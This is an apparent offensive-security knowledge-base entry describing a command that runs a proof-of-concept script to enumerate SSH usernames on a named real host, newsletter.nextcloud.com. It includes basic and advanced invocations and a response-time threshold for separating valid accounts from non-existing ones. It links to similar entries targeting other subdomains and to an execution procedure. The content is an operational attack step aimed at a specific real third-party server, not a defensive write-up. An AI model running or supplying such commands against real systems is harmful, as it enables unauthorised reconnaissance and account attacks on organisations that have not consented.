---
id: cmd-001
data: python POC.py newsletter.nextcloud.com -U usernames.txt
tags:
  - enumeration
  - ssh
type: command
output: >-
  Output showing usernames with response times; users with time <
  0.04717744470807732 are non-existing
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.926Z'
verified: false
validated: true
submitted: true
---
# python-poc-py-username-enumeration-newsletter-nextcloud-com

## Command

```bash
python POC.py newsletter.nextcloud.com -U usernames.txt
```

## Description

Executes the POC script to enumerate usernames on newsletter.nextcloud.com by timing SSH authentication attempts with a large password, identifying valid accounts via response time differences.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| hostname | Target SSH server (e.g., newsletter.nextcloud.com) | Yes |
| -U | Path to usernames.txt file containing list of usernames to test | Yes |

## Examples

### Basic Usage

```bash
python POC.py newsletter.nextcloud.com -U usernames.txt
```

### Advanced Usage

```bash
python POC.py newsletter.nextcloud.com -U /path/to/large-usernames.txt > results.txt
```

## Expected Output

Console output with lines like: username: response_time (seconds). Times < ~0.047s indicate non-existing users; higher times suggest valid usernames.

## Related

- [[commands/python-poc-py-username-enumeration-stats-nextcloud-com]]
- [[procedures/Execute-Username-Enumeration-on-Newsletter-Subdomain]]
